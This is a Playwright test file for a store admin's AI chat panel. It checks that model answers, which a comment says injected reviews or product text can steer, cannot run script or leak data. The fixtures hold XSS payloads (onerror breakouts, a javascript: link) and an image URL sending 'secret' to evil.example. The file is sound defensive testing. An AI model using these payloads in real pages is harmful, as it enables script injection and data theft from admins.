/*
 * Copyright © Mago Assistant
 */

import {expect, type Page, test} from '@playwright/test';
import ChatPanel from 'Pages/backend/ChatPanel';
import ChatMock from 'Actions/backend/ChatMock';
import {markdownAnswer} from 'Fixtures/scenarios';
import {PROVIDER_ROUND_TRIP_TIMEOUT} from 'Config/timeouts';

const chatPanel = new ChatPanel();
const chatMock = new ChatMock();

const EVIL_HOST = /evil\.example/;

/**
 * The model's answer is attacker-influenceable: a guest review or a product description it reads
 * can tell it what to write. Whatever markdown it comes up with, the admin page must not run script,
 * load anything off-site by itself, or offer a link that only looks like it stays in the admin.
 */
async function wasScriptRun(page: Page): Promise<boolean> {
  return page.evaluate(() => (window as unknown as {magoXss?: boolean}).magoXss === true);
}

test.describe('Chat panel answer rendering', () => {
  test('it does not let an image alt text break out into an attribute', async ({page}) => {
    await chatMock.install(page, markdownAnswer('Look: ![x" onerror="window.magoXss=true](/static/pixel.png)'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'Summarise the reviews');

    const answer = chatPanel.lastAssistantMessage(page);
    await expect(answer).toContainText('Look:');
    await expect(answer.locator('[onerror]')).toHaveCount(0);
    expect(await wasScriptRun(page)).toBe(false);
  });

  test('it shows raw html from the answer as text', async ({page}) => {
    await chatMock.install(page, markdownAnswer('Note <img src=x onerror="window.magoXss=true"> here'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'Summarise the reviews');

    const answer = chatPanel.lastAssistantMessage(page);
    await expect(answer).toContainText('<img src=x');
    await expect(answer.locator('img')).toHaveCount(0);
    expect(await wasScriptRun(page)).toBe(false);
  });

  test('it shows the alt text of an off-site image instead of loading it', async ({page}) => {
    const offSiteRequests = chatMock.countRequestsTo(page, EVIL_HOST);
    await chatMock.install(page, markdownAnswer('Chart: ![sales chart](https://evil.example/pixel.png?d=secret)'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'Show me the sales chart');

    const answer = chatPanel.lastAssistantMessage(page);
    await expect(answer).toContainText('sales chart');
    await expect(answer.locator('img')).toHaveCount(0);
    expect(offSiteRequests.total()).toBe(0);
  });

  test('it still renders an image from the store itself', async ({page}) => {
    await chatMock.install(page, markdownAnswer('Logo: ![store logo](/static/logo.png)'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'Show me the logo');

    await expect(chatPanel.lastAssistantMessage(page).locator('img[alt="store logo"]'))
      .toHaveAttribute('src', '/static/logo.png');
  });

  test('it does not turn a javascript url into a link', async ({page}) => {
    await chatMock.install(page, markdownAnswer('Please [click here](javascript:window.magoXss=true) to continue'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'What should I do?');

    const answer = chatPanel.lastAssistantMessage(page);
    await expect(answer).toContainText('click here');
    await expect(answer.locator('a')).toHaveCount(0);
  });

  test('it does not turn a protocol-relative or backslash url into a link', async ({page}) => {
    await chatMock.install(page, markdownAnswer('Open [orders](//evil.example/phish) or [invoices](/\\evil.example/phish)'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'Where are my orders?');

    const answer = chatPanel.lastAssistantMessage(page);
    await expect(answer).toContainText('orders');
    await expect(answer).toContainText('invoices');
    await expect(answer.locator('a')).toHaveCount(0);
  });

  test('it opens an admin link in the same tab and an off-site link in a new one', async ({page}) => {
    await chatMock.install(page, markdownAnswer('See [orders](/admin/sales/order/) and [the docs](https://docs.example.com/guide)'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'Where are my orders?');

    const answer = chatPanel.lastAssistantMessage(page);
    await expect(answer.locator('a', {hasText: 'orders'})).toHaveAttribute('target', '_self');
    await expect(answer.locator('a', {hasText: 'the docs'})).toHaveAttribute('target', '_blank');
    await expect(answer.locator('a', {hasText: 'the docs'})).toHaveAttribute('rel', 'noopener noreferrer');
  });

  test('it still wraps a table so it can scroll', async ({page}) => {
    await chatMock.install(page, markdownAnswer('| SKU | Qty |\n|---|---|\n| MH01 | 2 |\n'));
    await chatPanel.openOnDashboard(page);
    await chatPanel.askAndAwaitReply(page, 'Stock levels');

    await expect(chatPanel.lastAssistantMessage(page).locator('.mago-table-wrap table td').first()).toHaveText('MH01');
  });
});

/**
 * The conversation view renders a stored answer again, after the fact, through the same renderer.
 * The answer is stored by the real backend, with only the provider played by WireMock
 * (wiremock/mappings/markdown-sanitizing.json).
 */
test.describe('Conversation view answer rendering', () => {
  test('it renders a stored malicious answer without running or loading anything', async ({page}) => {
    test.setTimeout(60000);

    const offSiteRequests = chatMock.countRequestsTo(page, EVIL_HOST);
    await chatPanel.openOnDashboard(page);
    await chatPanel.ask(page, 'Please run the E2E Markdown Sanitizing Check.');
    await expect(chatPanel.lastAssistantMessage(page)).toContainText('Stored review summary.', {timeout: PROVIDER_ROUND_TRIP_TIMEOUT});

    const conversationId = await page.evaluate(() => sessionStorage.getItem('mago_conv'));
    expect(conversationId, 'the panel never stored a conversation id').not.toBeNull();

    await page.goto(await chatPanel.keyedUrlFor(page, 'mago/conversations/view/id/' + conversationId), {waitUntil: 'load'});

    const answer = page.locator('.mago-conv-msg--assistant .mago-conv-body').last();
    await expect(answer).toContainText('Stored review summary.');
    /* The server renders "![pixel](...)" as literal text; once the shared renderer has run it is
       the alt text alone, which is what proves the assertions below are on the re-rendered body. */
    await expect(answer).not.toContainText('![pixel]');
    await expect(answer).toContainText('pixel');
    await expect(answer.locator('img')).toHaveCount(0);
    await expect(answer.locator('[onerror]')).toHaveCount(0);
    await expect(answer.locator('a', {hasText: 'run me'})).toHaveCount(0);
    await expect(answer.locator('a', {hasText: 'off site'})).toHaveCount(0);
    await expect(answer.locator('a', {hasText: 'orders'})).toHaveAttribute('target', '_self');
    expect(await wasScriptRun(page)).toBe(false);
    expect(offSiteRequests.total()).toBe(0);
  });
});
